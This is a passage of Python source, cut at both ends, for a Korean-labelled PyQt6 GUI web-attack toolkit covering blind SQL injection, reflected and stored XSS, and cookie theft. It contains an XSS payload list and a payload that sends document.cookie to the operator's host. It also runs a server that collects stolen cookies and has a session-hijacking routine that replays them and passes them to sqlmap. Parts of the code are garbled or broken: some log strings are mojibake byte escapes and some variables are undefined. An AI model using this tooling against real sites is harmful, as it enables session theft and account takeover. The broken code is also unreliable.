        b = btn("▶  Time-based Blind 추출", ACCENT2, "white"); b.clicked.connect(self._run_time_blind)
        b4.addWidget(b)

        lay.addSpacing(8)
        lay.addWidget(sep())
        b_stop = btn("■  Blind 중지", RED, "white")
        b_stop.clicked.connect(self._stop)
        lay.addWidget(b_stop)
        lay.addStretch()

    def _blind_box(self, parent_lay, title, color, desc):
        box = QFrame()
        box.setStyleSheet(f"QFrame {{ background-color: {BG3}; border-radius: 6px; border: 1px solid {BORDER}; }}")
        bl = QVBoxLayout(box)
        bl.setContentsMargins(10,8,10,10); bl.setSpacing(4)
        lbl = QLabel(title)
        lbl.setStyleSheet(f"color: {color}; font-weight: bold; font-size: 12px; border: none;")
        bl.addWidget(lbl)
        bl.addWidget(dim_label(desc))
        parent_lay.addWidget(box)
        return bl

    def _build_sqlmap_right(self, parent):
        lay = QVBoxLayout(parent)
        lay.setContentsMargins(0,0,0,0)

        self.out_tab = QTabWidget()
        lay.addWidget(self.out_tab)

        # 로그 탭
        log_w = QWidget()
        log_l = QVBoxLayout(log_w)
        log_l.setContentsMargins(4,4,4,4)
        self.output = QTextEdit()
        self.output.setReadOnly(True)
        self.output.setFont(QFont("Courier New", 11))
        log_l.addWidget(self.output)

        bot = QWidget()
        bot.setFixedHeight(32)
        bot.setStyleSheet(f"background-color: {BG3};")
        bl2 = QHBoxLayout(bot)
        bl2.setContentsMargins(8,2,8,2)
        self.time_lbl = QLabel("")
        self.time_lbl.setStyleSheet(f"color: {TEXT_DIM}; font-size: 10px;")
        clear_btn = btn("클리어", BG3, TEXT_DIM, w=70, h=24)
        clear_btn.clicked.connect(self._clear)
        save_btn  = btn("저장",   BG3, TEXT_DIM, w=60, h=24)
        save_btn.clicked.connect(self._save)
        bl2.addWidget(clear_btn); bl2.addWidget(save_btn)
        bl2.addStretch(); bl2.addWidget(self.time_lbl)
        log_l.addWidget(bot)
        self.out_tab.addTab(log_w, "📋  로그")

        # 데이터 뷰 탭
        data_w = QWidget()
        dl = QVBoxLayout(data_w)
        dl.setContentsMargins(4,4,4,4)

        dtb = QWidget()
        dtb.setFixedHeight(34)
        dtb.setStyleSheet(f"background-color: {BG3};")
        dtbl = QHBoxLayout(dtb)
        dtbl.setContentsMargins(10,4,10,4)
        self._row_count_lbl = QLabel("덤프 결과")
        self._row_count_lbl.setStyleSheet(f"color: {ACCENT}; font-weight: bold; border: none;")
        csv_btn = btn("CSV 저장", BG3, ACCENT, w=90, h=26)
        csv_btn.clicked.connect(self._save_csv)
        dtbl.addWidget(self._row_count_lbl); dtbl.addStretch(); dtbl.addWidget(csv_btn)
        dl.addWidget(dtb)

        self._data_tree = QTreeWidget()
        self._data_tree.setAlternatingRowColors(True)
        self._data_tree.setRootIsDecorated(False)
        dl.addWidget(self._data_tree)
        self.out_tab.addTab(data_w, "📊  데이터 뷰")

    # ══════════════════════════════════════════════════════
    #  XSS 탭
    # ══════════════════════════════════════════════════════
    def _build_xss_tab(self, parent):
        lay = QHBoxLayout(parent)
        lay.setContentsMargins(8,8,8,8)
        lay.setSpacing(6)

        # 왼쪽 설정
        left = QWidget(); left.setFixedWidth(340)
        lay.addWidget(left)
        self._build_xss_left(left)

        # 오른쪽 출력
        right = QWidget()
        lay.addWidget(right, 1)
        self._build_xss_right(right)

    def _build_xss_left(self, parent):
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        inner = QWidget()
        lay   = QVBoxLayout(inner)
        lay.setContentsMargins(12,8,12,8)
        lay.setSpacing(6)
        scroll.setWidget(inner)
        outer = QVBoxLayout(parent)
        outer.setContentsMargins(0,0,0,0)
        outer.addWidget(scroll)

        # TARGET
        lay.addWidget(section_label("[ TARGET ]", BLUE))
        lay.addWidget(sep())
        lay.addWidget(dim_label("대상 URL"))
        self.xss_url_entry = QLineEdit()
        self.xss_url_entry.setPlaceholderText("http://192.168.x.x/page?keyword=test")
        lay.addWidget(self.xss_url_entry)

        self.xss_detect_btn = btn("🔎  파라미터 자동 탐지", PURPLE, "white")
        self.xss_detect_btn.clicked.connect(self._xss_auto_detect)
        lay.addWidget(self.xss_detect_btn)

        lay.addWidget(dim_label("탐지된 파라미터"))
        self.xss_param_combo = QComboBox()
        self.xss_param_combo.currentIndexChanged.connect(self._xss_on_param_select)
        lay.addWidget(self.xss_param_combo)
        self.xss_detected_params = []

        lay.addWidget(dim_label("쿠키 (선택)"))
        self.xss_cookie_entry = QLineEdit()
        lay.addWidget(self.xss_cookie_entry)

        # 수동 페이로드 입력
        lay.addSpacing(6)
        manual_box = QFrame()
        manual_box.setStyleSheet(f"QFrame {{ background:{BG3}; border-radius:6px; border:1px solid {BORDER}; }}")
        ml = QVBoxLayout(manual_box)
        ml.setContentsMargins(10,8,10,10); ml.setSpacing(4)
        mt = QLabel("✏️  수동 페이로드 입력")
        mt.setStyleSheet(f"color:{ACCENT}; font-weight:bold; font-size:12px; border:none;")
        ml.addWidget(mt)
        ml.addWidget(dim_label("파라미터 선택"))
        self.xss_manual_param = QComboBox()
        self.xss_manual_param.setEditable(True)
        ml.addWidget(self.xss_manual_param)
        ml.addWidget(dim_label("페이로드"))
        self.xss_manual_payload = QLineEdit()
        self.xss_manual_payload.setPlaceholderText("<script>alert(1)</script>")
        ml.addWidget(self.xss_manual_payload)
        ml.addWidget(dim_label("HTTP 메서드"))
        xss_method_row = QHBoxLayout()
        self.xss_manual_method = QButtonGroup(self)
        rb_get  = QRadioButton("GET");  rb_get.setChecked(True)
        rb_post = QRadioButton("POST")
        self.xss_manual_method.addButton(rb_get, 0)
        self.xss_manual_method.addButton(rb_post, 1)
        xss_method_row.addWidget(rb_get); xss_method_row.addWidget(rb_post)
        xss_method_row.addStretch()
        ml.addLayout(xss_method_row)
        b_manual = btn("▶  전송 & 응답 확인", ACCENT, BG)
        b_manual.clicked.connect(self._run_xss_manual)
        ml.addWidget(b_manual)
        lay.addWidget(manual_box)

        # 반사형 XSS
        lay.addSpacing(6)
        ref_box = QFrame()
        ref_box.setStyleSheet(f"QFrame {{ background:{BG3}; border-radius:6px; border:1px solid {BORDER}; }}")
        rl = QVBoxLayout(ref_box)
        rl.setContentsMargins(10,8,10,10); rl.setSpacing(4)
        rl.addWidget(QLabel("🔴  반사형 XSS (Reflected)") )
        rl.addWidget(dim_label("입력값이 즉시 응답에 반사되는지 확인"))
        ref_box.layout().itemAt(0).widget().setStyleSheet(f"color:{RED}; font-weight:bold; font-size:12px; border:none;")

        self.xss_reflected_cb = QCheckBox("기본 페이로드")
        self.xss_reflected_cb.setChecked(True)
        rl.addWidget(self.xss_reflected_cb)
        self.xss_cookie_cb = QCheckBox("쿠키 탈취 페이로드")
        self.xss_cookie_cb.setChecked(True)
        rl.addWidget(self.xss_cookie_cb)

        b_ref = btn("▶  반사형 XSS 탐지", RED, "white")
        b_ref.clicked.connect(self._run_reflected_xss)
        rl.addWidget(b_ref)
        lay.addWidget(ref_box)

        # 저장형 XSS
        stor_box = QFrame()
        stor_box.setStyleSheet(f"QFrame {{ background:{BG3}; border-radius:6px; border:1px solid {BORDER}; }}")
        sl = QVBoxLayout(stor_box)
        sl.setContentsMargins(10,8,10,10); sl.setSpacing(4)
        title2 = QLabel("🟡  저장형 XSS (Stored)")
        title2.setStyleSheet(f"color:{YELLOW}; font-weight:bold; font-size:12px; border:none;")
        sl.addWidget(title2)
        sl.addWidget(dim_label("삽입 URL과 확인 URL이 다름 (게시판, 댓글 등)"))

        # 삽입 URL
        sl.addWidget(dim_label("삽입 URL (POST)"))
        store_url_row = QHBoxLayout()
        self.xss_store_url = QLineEdit()
        self.xss_store_url.setPlaceholderText("http://x.x.x.x/board/write.php")
        store_url_row.addWidget(self.xss_store_url)
        store_detect_btn = QPushButton("🔎")
        store_detect_btn.setFixedSize(32, 32)
        store_detect_btn.setToolTip("삽입 URL 파라미터 탐지")
        store_detect_btn.setStyleSheet(f"background:{PURPLE}; color:white; border:none; border-radius:4px; font-size:14px;")
        store_detect_btn.clicked.connect(self._xss_store_detect)
        store_url_row.addWidget(store_detect_btn)
        sl.addLayout(store_url_row)

        sl.addWidget(dim_label("탐지된 파라미터 → POST 데이터 자동 완성"))
        self.xss_store_param_combo = QComboBox()
        self.xss_store_param_combo.currentIndexChanged.connect(self._xss_store_param_select)
        sl.addWidget(self.xss_store_param_combo)
        self.xss_store_detected = []

        sl.addWidget(dim_label("POST 데이터 (페이로드 위치에 XSS_PAYLOAD 입력)"))
        self.xss_store_data = QLineEdit()
        self.xss_store_data.setPlaceholderText("title=XSS_PAYLOAD&content=test")
        sl.addWidget(self.xss_store_data)

        # 확인 URL
        sl.addWidget(dim_label("확인 URL (삽입 후 조회할 페이지)"))
        check_url_row = QHBoxLayout()
        self.xss_check_url = QLineEdit()
        self.xss_check_url.setPlaceholderText("http://x.x.x.x/board/list.php")
        check_url_row.addWidget(self.xss_check_url)
        check_detect_btn = QPushButton("🔎")
        check_detect_btn.setFixedSize(32, 32)
        check_detect_btn.setToolTip("확인 URL 파라미터 탐지")
        check_detect_btn.setStyleSheet(f"background:{BLUE}; color:white; border:none; border-radius:4px; font-size:14px;")
        check_detect_btn.clicked.connect(self._xss_check_detect)
        check_url_row.addWidget(check_detect_btn)
        sl.addLayout(check_url_row)
        sl.addWidget(dim_label("← 확인 URL은 GET 파라미터도 탐지"))

        b_stor = btn("▶  저장형 XSS 탐지", YELLOW, BG)
        b_stor.clicked.connect(self._run_stored_xss)
        sl.addWidget(b_stor)
        lay.addWidget(stor_box)

        # 페이로드 모음
        pay_box = QFrame()
        pay_box.setStyleSheet(f"QFrame {{ background:{BG3}; border-radius:6px; border:1px solid {BORDER}; }}")
        pl2 = QVBoxLayout(pay_box)
        pl2.setContentsMargins(10,8,10,10); pl2.setSpacing(4)
        title3 = QLabel("📋  XSS 페이로드 모음")
        title3.setStyleSheet(f"color:{PURPLE}; font-weight:bold; font-size:12px; border:none;")
        pl2.addWidget(title3)
        pl2.addWidget(dim_label("클릭하면 클립보드에 복사"))

        payloads = [
            ("기본 팝업",       "<script>alert('XSS')</script>"),
            ("img 태그",        "<img src=x onerror=alert(1)>"),
            ("svg 태그",        "<svg onload=alert(1)>"),
            ("쿠키 출력",       "<script>alert(document.cookie)</script>"),
            ("쿠키 img",        "<img src=x onerror=alert(document.cookie)>"),
            ("우회 (대소문자)", "<ScRiPt>alert(1)</ScRiPt>"),
            ("우회 (인코딩)",   "&#60;script&#62;alert(1)&#60;/script&#62;"),
            ("href js",         "<a href=javascript:alert(1)>클릭</a>"),
        ]
        for name, payload in payloads:
            row = QHBoxLayout()
            lbl2 = QLabel(name)
            lbl2.setStyleSheet(f"color:{TEXT_DIM}; font-size:10px; border:none;")
            lbl2.setFixedWidth(90)
            row.addWidget(lbl2)
            pb = QPushButton(payload[:40] + ("..." if len(payload) > 40 else ""))
            pb.setStyleSheet(f"""
                QPushButton {{
                    background:{BG2}; color:{ACCENT}; border:none;
                    border-radius:3px; padding:3px 6px;
                    font-size:10px; text-align:left;
                }}
                QPushButton:hover {{ background:{BG}; }}
            """)
            pb.setFixedHeight(26)
            pb.clicked.connect(lambda _, p=payload: (
                QApplication.clipboard().setText(p),
                self.xss_log.append(f'<span style="color:{ACCENT}">클립보드 복사: {p}</span>')
            ))
            row.addWidget(pb, 1)
            pl2.addLayout(row)
        lay.addWidget(pay_box)

        lay.addSpacing(6)
        lay.addWidget(sep())
        xss_stop = btn("■  중지", RED, "white")
        xss_stop.clicked.connect(self._stop_xss)
        lay.addWidget(xss_stop)
        lay.addStretch()

    def _build_xss_right(self, parent):
        lay = QVBoxLayout(parent)
        lay.setContentsMargins(0,0,0,0)

        self.xss_out_tab = QTabWidget()
        lay.addWidget(self.xss_out_tab)

        # 로그
        log_w = QWidget()
        ll = QVBoxLayout(log_w); ll.setContentsMargins(4,4,4,4)
        self.xss_log = QTextEdit()
        self.xss_log.setReadOnly(True)
        self.xss_log.setFont(QFont("Courier New", 11))
        ll.addWidget(self.xss_log)
        self.xss_out_tab.addTab(log_w, "📋  탐지 로그")

        # 결과
        res_w = QWidget()
        rl2 = QVBoxLayout(res_w); rl2.setContentsMargins(4,4,4,4)
        self.xss_result_tree = QTreeWidget()
        self.xss_result_tree.setAlternatingRowColors(True)
        self.xss_result_tree.setRootIsDecorated(False)
        self.xss_result_tree.setHeaderLabels(["유형","URL","파라미터","페이로드","비고"])
        self.xss_result_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents)
        rl2.addWidget(self.xss_result_tree)
        self.xss_out_tab.addTab(res_w, "🚨  발견된 XSS")

        # 쿠키 수신 탭
        cookie_w = QWidget()
        cl = QVBoxLayout(cookie_w); cl.setContentsMargins(4,4,4,4); cl.setSpacing(6)

        # 수신 서버 컨트롤
        srv_box = QFrame()
        srv_box.setStyleSheet(f"QFrame {{ background:{BG3}; border-radius:6px; border:1px solid {BORDER}; }}")
        sl2 = QVBoxLayout(srv_box); sl2.setContentsMargins(10,8,10,10); sl2.setSpacing(4)
        srv_title = QLabel("🎣  쿠키 수신 서버")
        srv_title.setStyleSheet(f"color:{RED}; font-weight:bold; font-size:12px; border:none;")
        sl2.addWidget(srv_title)
        sl2.addWidget(dim_label("XSS 페이로드로 탈취된 쿠키를 수신 대기"))

        port_row = QHBoxLayout()
        port_row.addWidget(dim_label("포트"))
        self.cookie_srv_port = QLineEdit("8877")
        self.cookie_srv_port.setFixedWidth(70)
        port_row.addWidget(self.cookie_srv_port)
        port_row.addSpacing(10)
        self.cookie_srv_status = QLabel("● 중지됨")
        self.cookie_srv_status.setStyleSheet(f"color:{TEXT_DIM}; border:none;")
        port_row.addWidget(self.cookie_srv_status)
        port_row.addStretch()
        sl2.addLayout(port_row)

        # 수신용 페이로드 자동 생성
        sl2.addWidget(dim_label("수신용 페이로드 (복사해서 삽입)"))
        self.cookie_payload_view = QLineEdit()
        self.cookie_payload_view.setReadOnly(True)
        self.cookie_payload_view.setStyleSheet(f"background:{BG}; color:{ACCENT}; border:1px solid {BORDER}; border-radius:4px; padding:4px;")
        self.cookie_payload_view.setText('<script>fetch("http://127.0.0.1:8877/?c="+document.cookie)</script>')
        sl2.addWidget(self.cookie_payload_view)

        btn_row = QHBoxLayout()
        self.srv_start_btn = btn("▶  서버 시작", ACCENT, BG, h=32)
        self.srv_stop_btn  = btn("■  서버 중지", RED, "white", h=32)
        self.srv_stop_btn.setEnabled(False)
        copy_payload_btn   = btn("📋  페이로드 복사", BG3, TEXT_DIM, h=32)
        self.srv_start_btn.clicked.connect(self._start_cookie_server)
        self.srv_stop_btn.clicked.connect(self._stop_cookie_server)
        copy_payload_btn.clicked.connect(lambda: QApplication.clipboard().setText(
            self.cookie_payload_view.text()))
        btn_row.addWidget(self.srv_start_btn)
        btn_row.addWidget(self.srv_stop_btn)
        btn_row.addWidget(copy_payload_btn)
        sl2.addLayout(btn_row)
        cl.addWidget(srv_box)

        # 포트 변경시 페이로드 자동 업데이트
        self.cookie_srv_port.textChanged.connect(lambda p: self.cookie_payload_view.setText(
            f'<script>fetch("http://127.0.0.1:{p}/?c="+document.cookie)</script>'))

        # 수신된 쿠키 목록
        cl.addWidget(section_label("탈취된 쿠키 목록", RED))
        self.stolen_cookie_tree = QTreeWidget()
        self.stolen_cookie_tree.setAlternatingRowColors(True)
        self.stolen_cookie_tree.setRootIsDecorated(False)
        self.stolen_cookie_tree.setHeaderLabels(["시간","IP","쿠키값"])
        self.stolen_cookie_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents)
        self.stolen_cookie_tree.itemDoubleClicked.connect(self._use_stolen_cookie)
        cl.addWidget(self.stolen_cookie_tree)
        cl.addWidget(dim_label("더블클릭 → 해당 쿠키를 sqlmap/스캐너에 자동 입력"))

        # 세션 재사용
        sess_box = QFrame()
        sess_box.setStyleSheet(f"QFrame {{ background:{BG3}; border-radius:6px; border:1px solid {BORDER}; }}")
        ssbl = QVBoxLayout(sess_box); ssbl.setContentsMargins(10,8,10,10); ssbl.setSpacing(4)
        sess_title = QLabel("🔑  세션 하이재킹")
        sess_title.setStyleSheet(f"color:{YELLOW}; font-weight:bold; font-size:12px; border:none;")
        ssbl.addWidget(sess_title)
        ssbl.addWidget(dim_label("탈취한 쿠키로 인증 우회 테스트"))
        ssbl.addWidget(dim_label("대상 URL"))
        self.hijack_url = QLineEdit()
        self.hijack_url.setPlaceholderText("http://192.168.x.x/mypage")
        ssbl.addWidget(self.hijack_url)
        ssbl.addWidget(dim_label("쿠키값 (목록에서 더블클릭하면 자동 입력)"))
        self.hijack_cookie = QLineEdit()
        self.hijack_cookie.setPlaceholderText("PHPSESSID=abcdef1234...")
        ssbl.addWidget(self.hijack_cookie)
        b_hijack = btn("▶  세션 하이재킹 테스트", YELLOW, BG, h=34)
        b_hijack.clicked.connect(self._run_hijack)
        ssbl.addWidget(b_hijack)
        cl.addWidget(sess_box)

        self.xss_out_tab.addTab(cookie_w, "🍪  쿠키 탈취/하이재킹")
        self._cookie_server = None

    # ── XSS 탐지 로직 ────────────────────────────────────
    def _xss_log(self, text, color=None):
        c = color or TEXT
        cursor = self.xss_log.textCursor()
        cursor.movePosition(QTextCursor.MoveOperation.End)
        fmt = cursor.charFormat()
        fmt.setForeground(QColor(c))
        cursor.setCharFormat(fmt)
        cursor.insertText(text)
        self.xss_log.setTextCursor(cursor)
        self.xss_log.ensureCursorVisible()

    def _xss_store_detect(self):
        """삽입 URL 파라미터 탐지"""
        url = self.xss_store_url.text().strip()
        if not url: QMessageBox.critical(self,"오류","삽입 URL 입력해줘"); return
        if not url.startswith("http"): url = "http://"+url
        self._detect_params(url, self._xss_store_detect_done)

    def _xss_store_detect_done(self, found):
        if not found:
            QMessageBox.information(self,"결과","파라미터를 찾지 못했어"); return
        self.xss_store_detected = found
        self.xss_store_param_combo.clear()
        for label, full in found:
            self.xss_store_param_combo.addItem(label, full)
        self._xss_store_param_select(0)
        self._xss_log(f"\u2713 삽입 URL 파라미터 {len(found)}개 탐지됨\n", ACCENT)
    def _xss_store_param_select(self, idx):
        """파라미터 선택시 POST 데이터 자동 완성"""
        if idx < 0 or idx >= len(self.xss_store_detected): return
        label, full = self.xss_store_detected[idx]
        if "||POST||" in full:
            # POST 파라미터 → POST 데이터 자동 완성
            parts   = full.split("||POST||")
            action  = parts[0]
            param   = parts[1].split("=")[0]
            self.xss_store_url.setText(action)
            self.xss_store_data.setText(f"{param}=XSS_PAYLOAD")
        else:
            # GET 파라미터
            parsed = urllib.parse.urlparse(full)
            qs     = urllib.parse.parse_qs(parsed.query)
            params = list(qs.keys())
            if params:
                param = params[0]
                self.xss_store_url.setText(full)
                self.xss_store_data.setText(f"{param}=XSS_PAYLOAD")

    def _xss_check_detect(self):
        """확인 URL 파라미터 탐지"""
        url = self.xss_check_url.text().strip()
        if not url: QMessageBox.critical(self,"오류","확인 URL 입력해줘"); return
        if not url.startswith("http"): url = "http://"+url
        self._detect_params(url, self._xss_check_detect_done)

    def _xss_check_detect_done(self, found):
        if not found:
            QMessageBox.information(self,"결과","파라미터를 찾지 못했어\n확인 URL은 파라미터 없어도 됨"); return
        # 확인 URL은 파라미터 없어도 되니까 그냥 정보만 출력
        self._xss_log(f"\u2713 확인 URL 파라미터 {len(found)}개 발견\n", BLUE)
        for label, _ in found:
            self._xss_log(f"  {label}\n", TEXT_DIM)
        if not url: QMessageBox.critical(self,"오류","URL 입력해줘"); return
        self._detect_params(url, self._xss_detect_done, self.xss_detect_btn)

    def _xss_detect_done(self, found):
        if not found:
            QMessageBox.information(self,"결과","파라미터를 찾지 못했어"); return
        self.xss_detected_params = found
        self.xss_param_combo.clear()
        self.xss_manual_param.clear()
        for label, full in found:
            self.xss_param_combo.addItem(label)
            # 파라미터 이름만 추출해서 수동 콤보에 추가
            param_name = label.split("?")[-1].split("=")[0].strip().lstrip("[GET FORM] ").lstrip("[POST FORM] ").lstrip("[LINK] ").split("?")[-1]
            self.xss_manual_param.addItem(param_name, full)
        self._xss_on_param_select(0)
        self._xss_log(f"\u2713 파라미터 {len(found)}개 탐지됨\n", ACCENT)

    def _xss_on_param_select(self, idx):
        if idx < 0 or idx >= len(self.xss_detected_params): return
        label, full = self.xss_detected_params[idx]
        if "||POST||" not in full:
            self.xss_url_entry.setText(full)

    def _blind_auto_detect(self):
        url = self.blind_url_entry.text().strip()
        if not url: QMessageBox.critical(self,"오류","URL 입력해줘"); return
        self._detect_params(url, self._blind_detect_done, self.blind_detect_btn)

    def _blind_detect_done(self, found):
        if not found:
            QMessageBox.information(self,"결과","파라미터를 찾지 못했어"); return
        self.blind_detected_params = found
        self.blind_param_combo.clear()
        self.blind_manual_param.clear()
        for label, full in found:
            self.blind_param_combo.addItem(label)
            param_name = label.split("?")[-1].split("=")[0].strip()
            self.blind_manual_param.addItem(param_name, full)
        self._blind_on_param_select(0)

    def _blind_on_param_select(self, idx):
        if idx < 0 or idx >= len(self.blind_detected_params): return
        label, full = self.blind_detected_params[idx]
        if "||POST||" not in full:
            self.blind_url_entry.setText(full)

    def _run_xss_manual(self):
        """XSS 수동 페이로드 전송"""
        url     = self.xss_url_entry.text().strip()
        payload = self.xss_manual_payload.text().strip()
        param   = self.xss_manual_param.currentText().strip()
        if not url or not payload or not param:
            QMessageBox.critical(self,"오류","URL / 파라미터 / 페이로드 입력해줘"); return
        if not url.startswith("http"): url = "http://"+url
        cookie  = self.xss_cookie_entry.text().strip()
        method  = self.xss_manual_method.checkedId()
        threading.Thread(
            target=self._manual_send,
            args=(url, param, payload, method, cookie, "xss"),
            daemon=True).start()

    def _run_blind_manual(self):
        """Blind SQLi 수동 페이로드 전송"""
        url      = self.blind_url_entry.text().strip()
        payload  = self.blind_manual_payload.text().strip()
        param    = self.blind_manual_param.currentText().strip()
        method   = self.blind_manual_method.checkedId()
        post_tmpl= self.blind_manual_post.text().strip()
        if not url or not payload or not param:
            QMessageBox.critical(self,"오류","URL / 파라미터 / 페이로드 입력해줘"); return
        if not url.startswith("http"): url = "http://"+url
        threading.Thread(
            target=self._manual_send,
            args=(url, param, payload, method, "", "blind", post_tmpl),
            daemon=True).start()

    def _manual_send(self, url, param, payload, method, cookie,
                     mode, post_tmpl=""):
        """공통 수동 전송 로직"""
        import time
        session = requests.Session()
        session.headers["User-Agent"] = "Mozilla/5.0"
        if cookie: session.headers["Cookie"] = cookie

        log = self._xss_log if mode == "xss" else (
              lambda t, c=None: self._log(t, "info"))

        log(f"\n" + "-"*44 + "\n", BORDER)
        log("  \xec\x88\x98\xeb\x8f\x99 \xec\xa0\x84\xec\x86\xa1\n", BLUE)
        log(f"  \xed\x8c\x8c\xeb\x9d\xbc\xeb\xaf\xb8\ud130 : {param}\n", TEXT_DIM)
        log(f"  \xed\x8e\x98\xec\x9d\xb4\xeb\xa1\x9c\xeb\x93\x9c : {payload}\n", YELLOW)
        log(f"  \uba54\uc11c\ub4dc   : {'GET' if method==0 else 'POST'}\n", TEXT_DIM)
        log("-"*44 + "\n\n", BORDER)
        try:
            t0 = time.time()
            if method == 0:
                # GET
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[param] = [payload]
                req_url = parsed._replace(
                    query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                log(f"  GET {req_url}\n", TEXT_DIM)
                r = session.get(req_url, timeout=10, verify=False)
            else:
                # POST
                if post_tmpl:
                    post_data = dict(urllib.parse.parse_qsl(
                        post_tmpl.replace("PAYLOAD", payload)))
                else:
                    log(f"  POST {url}  data: {post_data}\n", TEXT_DIM)
                r = session.post(url, data=post_data, timeout=10, verify=False)

            elapsed = time.time() - t0
            log(f"\n  응답 코드  : {r.status_code}\n", ACCENT)
            log(f"  응답 길이  : {len(r.text)} bytes\n", ACCENT)
            log(f"  응답 시간  : {elapsed:.2f}초\n", ACCENT)

            # 페이로드 반사 확인
            if payload in r.text:
                log(f"\n  [반사 감지!] 페이로드가 응답에 포함됨\n", RED)
            else:
                log("\n  [-] 페이로드 반사 없음\n", TEXT_DIM)

            # 응답 미리보기 (500자)
            preview = r.text[:500].replace("\n", " ").replace("\r", "")
            log(f"\n  응답 미리보기:\n  {preview}\n", TEXT_DIM)

            # SQLi 에러 확인 (Blind 모드)
            if mode == "blind":
                body = r.text.lower()
                for err in SQLI_ERRORS:
                    if err in body:
                        self._log(f"  [SQLi 에러] '{err}' 감지!\n", "error")
                        break

        except Exception as e:
            log(f"  [오류] {e}\n", RED)

    # ── 쿠키 수신 서버 ──────────────────────────────────
    def _start_cookie_server(self):
        port = int(self.cookie_srv_port.text().strip() or 8877)
        if self._cookie_server:
            QMessageBox.warning(self,"알림","이미 실행 중"); return
        try:
            from http.server import HTTPServer, BaseHTTPRequestHandler
            import urllib.parse as up

            toolkit = self

            class CookieHandler(BaseHTTPRequestHandler):
                def do_GET(self):
                    parsed = up.urlparse(self.path)
                    qs     = up.parse_qs(parsed.query)
                    cookie = qs.get("c", ["(없음)"])[0]
                    ip     = self.client_address[0]
                    now    = datetime.now().strftime("%H:%M:%S")
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b"ok")
                    from PyQt6.QtCore import QMetaObject, Qt
                    toolkit._stolen_data = (now, ip, cookie)
                    QMetaObject.invokeMethod(
                        toolkit, "_on_cookie_received",
                        Qt.ConnectionType.QueuedConnection)

                def log_message(self, *args): pass

            self._cookie_server = HTTPServer(("0.0.0.0", port), CookieHandler)
            self._srv_thread = threading.Thread(
                target=self._cookie_server.serve_forever, daemon=True)
            self._srv_thread.start()
            self.cookie_srv_status.setText(f"● 수신 중  :{port}")
            self.cookie_srv_status.setStyleSheet(f"color:{ACCENT}; border:none;")
            self.srv_start_btn.setEnabled(False)
            self.srv_stop_btn.setEnabled(True)
            self._xss_log(f"쿠키 수신 서버 시작  포트:{port}\n", ACCENT)
            # 페이로드 업데이트
            my_ip = self._get_local_ip()
            self.cookie_payload_view.setText(
                f'<script>fetch("http://{my_ip}:{port}/?c="+document.cookie)</script>')
        except Exception as e:
            QMessageBox.critical(self,"오류", f"서버 시작 실패: {e}")

    def _stop_cookie_server(self):
        if self._cookie_server:
            self._cookie_server.shutdown()
            self._cookie_server = None
        self.cookie_srv_status.setText("● 중지됨")
        self.cookie_srv_status.setStyleSheet(f"color:{TEXT_DIM}; border:none;")
        self.srv_start_btn.setEnabled(True)
        self.srv_stop_btn.setEnabled(False)
        self._xss_log("쿠키 수신 서버 중지\n", TEXT_DIM)

    def _get_local_ip(self):
        import socket
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    @pyqtSlot()
    def _on_cookie_received(self):
        now, ip, cookie = getattr(self, "_stolen_data", ("","",""))
        self._xss_log(f"\n[쿠키 수신!]\n  IP : {ip}\n  쿠키 : {cookie}\n", RED)
        item = QTreeWidgetItem([now, ip, cookie])
        item.setForeground(0, QColor(YELLOW))
        item.setForeground(2, QColor(ACCENT))
        self.stolen_cookie_tree.addTopLevelItem(item)
        self.stolen_cookie_tree.scrollToBottom()
        self.xss_out_tab.setCurrentIndex(2)

    def _use_stolen_cookie(self, item):
        cookie = item.text(2)
        self.hijack_cookie.setText(cookie)
        # sqlmap / 스캐너 쿠키란에도 자동 입력
        self.extra_entry.setText(f'--cookie="{cookie}"')
        self.scan_cookie_entry.setText(cookie)
        self.xss_cookie_entry.setText(cookie)
        QMessageBox.information(self, "적용됨", "쿠키가 자동 입력됐어\n- sqlmap 추가 플래그\n- 취약점 스캐너 쿠키\n- XSS 탭 쿠키")

    def _run_hijack(self):
        url    = self.hijack_url.text().strip()
        cookie = self.hijack_cookie.text().strip()
        if not url or not cookie:
            QMessageBox.critical(self,"오류","URL과 쿠키를 입력해줘"); return
        if not url.startswith("http"): url = "http://"+url
        threading.Thread(target=self._hijack_thread,
                         args=(url, cookie), daemon=True).start()

    def _hijack_thread(self, url, cookie):
        try:
            session = requests.Session()
            session.headers["User-Agent"] = "Mozilla/5.0"
            session.headers["Cookie"] = cookie
            r = session.get(url, timeout=10, verify=False)
            self._xss_log("\n" + "-"*44 + "\n", BORDER)
            self._xss_log("  세션 하이재킹 테스트\n", YELLOW)
            self._xss_log(f"  URL    : {url}\n", TEXT_DIM)
            self._xss_log(f"  쿠키   : {cookie[:60]}...\n", TEXT_DIM)
            self._xss_log(f"  응답   : {r.status_code}\n", ACCENT)
            self._xss_log(f"  길이   : {len(r.text)} bytes\n", ACCENT)
            # 로그인 성공 여부 힌트
            hints = ["logout","로그아웃","my account","마이페이지",
                     "welcome","환영","dashboard","관리자"]
            found = [h for h in hints if h in r.text.lower()]
            if found:
                self._xss_log(f"  [✓ 세션 유효!] 키워드 감지: {', '.join(found)}\n", ACCENT)
            else:
                self._xss_log("  [-] 세션 유효성 불명확 (응답 직접 확인 필요)\n", TEXT_DIM)
            # 응답 미리보기
            preview = r.text[:300].replace("\n"," ")
            self._xss_log(f"\n  미리보기:\n  {preview}\n", TEXT_DIM)
        except Exception as e:
            self._xss_log(f"  [오류] {e}\n", RED)

    def _stop_xss(self):
        self._xss_stop = True

    def _run_reflected_xss(self):
        url = self.xss_url_entry.text().strip()
        if not url: QMessageBox.critical(self,"오류","URL 입력해줘"); return
        if not url.startswith("http"): url = "http://"+url
        self._xss_stop = False
        self.xss_log.clear()
        self.xss_result_tree.clear()
        self._xss_log("="*48+"\n", BORDER)
        self._xss_log("  반사형 XSS 탐지 시작\n", BLUE)
        self._xss_log("="*48+"\n\n", BORDER)
        cookie = self.xss_cookie_entry.text().strip()
        payloads = []
        if self.xss_reflected_cb.isChecked():
